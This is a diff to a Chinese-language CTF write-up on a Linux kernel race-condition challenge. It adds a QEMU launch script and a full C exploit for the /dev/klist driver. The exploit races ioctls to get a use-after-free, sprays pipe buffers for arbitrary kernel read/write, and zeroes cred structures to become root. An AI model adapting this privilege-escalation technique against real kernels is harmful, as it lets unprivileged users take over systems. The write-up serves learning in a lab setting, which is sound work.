@@ -11,6 +11,19 @@ https://blog.csdn.net/seaaseesa/article/details/104649351
 
 https://blog.csdn.net/panhewu9919/article/details/100728934
 
+启动脚本
+```
+#!/bin/sh
+qemu-system-x86_64 \
+	-m 1024 -smp cores=2,threads=2,sockets=1 \
+	-display none -serial stdio -no-reboot \
+	-cpu kvm64,+smep \
+	-initrd ./rootfs.img \
+	-kernel ./bzImage \
+	-gdb tcp::1234 \
+	-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet "
+```
+
 ### 关于内核条件竞争漏洞
 条件竞争发生在多线程多进程中，往往是因为没有对全局数据、函数进行加锁，导致多进程同时访问修改，使得数据与理想的不一致而引发漏洞。
 ### 关于互斥锁
@@ -113,4 +126,164 @@ int __fastcall list_ioctl(__int64 a1, unsigned int a2, __int64 a3)
   }
   return result;
 }
+```
+最终的exp代码
+```
+// Exploit
+//pipe
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <linux/audit.h>
+#include <stdlib.h>
+#include <sys/prctl.h>
+#include <string.h>
+#include <sys/reg.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <sys/timerfd.h>
+// size of pipe buffers
+#define SIZE 0x280
+
+int list_add(int fd, char* data, long size) {
+    long io[2];
+    io[0] = size;
+    io[1] = (long)data;
+    return ioctl(fd, 0x1337, io);
+}
+
+int list_select(int fd, long index) {
+    return ioctl(fd, 0x1338, index);
+}
+
+int list_remove(int fd, long index) {
+    return ioctl(fd, 0x1339, index);
+}
+
+int list_do_head(int fd, char* data) {
+    return ioctl(fd, 0x133a, data);
+}
+
+void check_win()
+{
+    while(1) {
+        sleep(1);
+        if (getuid() == 0) {
+            system("cat /flag");
+            exit(0);
+        }
+    }
+}
+
+int main()
+{
+    /*setvbuf(stdout, NULL, _IONBF, 0);*/
+    pid_t child_pid;
+    char* bufA = malloc(SIZE);
+    memset(bufA, 'A', SIZE);
+    char* bufB = malloc(SIZE);
+    memset(bufB, 'B', SIZE);
+    char* buf2 = malloc(SIZE);
+    memset(buf2, 'C', SIZE);
+    char* buf3 = malloc(SIZE);
+    memset(buf3, 'D', SIZE);
+
+    int fd = open("/dev/klist", O_RDWR);
+    list_add(fd, bufA, SIZE-24);
+    list_select(fd, 0);
+
+    puts("beginning race");
+    child_pid = fork();
+    if (child_pid == 0)
+    {
+        for(int i = 0; i < 200; i++)     //开200个子进程，死循环，检查是否提权
+        {
+            child_pid = fork();
+            if(child_pid == 0)
+                check_win();
+        }
+
+        while(1)           // 死循环: add + remove 操作，读取到新数据就停止
+        {
+            list_add(fd, bufA, SIZE-24);     // 竞争点: remove时list_head线程插入一个put，bufA被释放，flag==0
+            list_select(fd, 0);  // 选择之后flag==1
+            // 目的已经达到，现在select一直选中这个块了，可以达到任意地址读写的目的
+            list_remove(fd, 0);              // 再释放一次bufA, 避免未碰撞时note增加太多。若竞争成功，会把bufA释放kfree两次，不会报错
+            list_add(fd, bufB, SIZE-24);     // bufA 恰好被B覆盖
+            read(fd, buf2, SIZE-24);
+            if(buf2[0] != 'A') {
+                puts("race won!");
+                break;
+            }
+            list_remove(fd, 0);              // 没赢，再次尝试
+        }
+
+        // 删除并添加管道来占据首个 note
+        sleep(1);
+        list_remove(fd, 0);
+        memset(buf3, 'E', SIZE);
+        int fds[2];
+
+        pipe(&fds[0]);
+        // 堆喷， 把size覆盖很大，这样就能任意读写。 其实可以只write 1次
+        for(int i = 0; i < 9; i++) {
+            write(fds[1], buf3, SIZE);
+        }
+
+        // 读取内存，泄露cred，修改cred
+        unsigned int *ibuf = (unsigned int *)malloc(0x1000000);
+        read(fd, ibuf, 0x1000000);
+        int j;
+        unsigned long max_i = 0;
+        int count = 0;
+        for(int i = 0; i < 0x1000000/4; i++)
+        {
+            if (ibuf[i] == 1000 && ibuf[i+1] == 1000 && ibuf[i+7] == 1000)
+            {
+                printf("[+] We got cred!\n");
+                //for (int x=0; x<10; x+=1)
+                //  printf("0x%x ",ibuf[x]);
+                max_i = i+8;
+                for(j = 0; j < 8; j++)
+                    ibuf[i+j] = 0;
+                count++;
+                if(count >= 2)
+                    break;
+            }
+        }
+        write(fd, ibuf, max_i*4);
+
+        check_win();
+    }
+    else if (child_pid > 0)
+    {
+        // 死循环: 调用list_head 尝试减去flag
+        // 读到新数据时停止
+        while(1) {
+            if(list_do_head(fd, buf3)) {
+                puts("wtf head failed");
+            }
+            read(fd, buf2, SIZE-24);
+            if(buf2[0] != 'A') {
+                puts("race won thread 2!");
+                break;
+            }
+        }
+        check_win();
+    }
+    else
+    {
+        puts("fork failed");
+        return -1;
+    }
+    return 0;
+}
+
 ```
